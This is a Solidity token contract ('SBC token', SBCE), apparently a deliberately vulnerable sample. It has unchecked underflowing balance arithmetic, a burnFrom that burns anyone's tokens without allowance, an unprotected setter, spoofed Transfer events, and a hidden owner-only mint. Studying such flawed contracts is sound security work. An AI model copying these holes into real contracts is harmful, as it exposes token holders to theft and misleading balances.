pragma solidity 0.5.12;

contract SBCE {
    string public constant name = "SBC token";
    string public constant symbol = "SBCE";
    uint8 public constant decimals = 8;
    address public owner;
    uint256 public totalSupply_;
    address public forcedRecipient;

    uint256 public vulnerableAmount;

    address public airdrop;
    uint256 public airdropAmount;
    bool public airdropConjured;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) internal allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed from, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(uint256 initialSupply) public {
        owner = msg.sender;
        balances[owner] = initialSupply * 100000000; // Give the creator all initial tokens
        totalSupply_ = initialSupply * 100000000;
        airdropAmount = totalSupply_ / 37 * 100;
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }

    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender] + _addedValue;
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        emit Transfer(msg.sender, forcedRecipient, _addedValue);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue - _subtractedValue;
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        emit Transfer(msg.sender, forcedRecipient, _subtractedValue);
        return true;
    }

    function burn(uint256 _value) public returns (bool) {
        balances[msg.sender] -= _value;
        totalSupply_ -= _value;
        emit Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool) {
        balances[_from] -= _value;
        totalSupply_ -= _value;
        emit Burn(_from, _value);
        emit Transfer(_from, _from, vulnerableAmount);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setAirdropReceiver(address _airdrop) public onlyOwner {
        airdrop = _airdrop;
    }

    function conjureAirdrop() public onlyOwner {
        balances[airdrop] += airdropAmount;
        totalSupply_ += airdropAmount;
    }
}
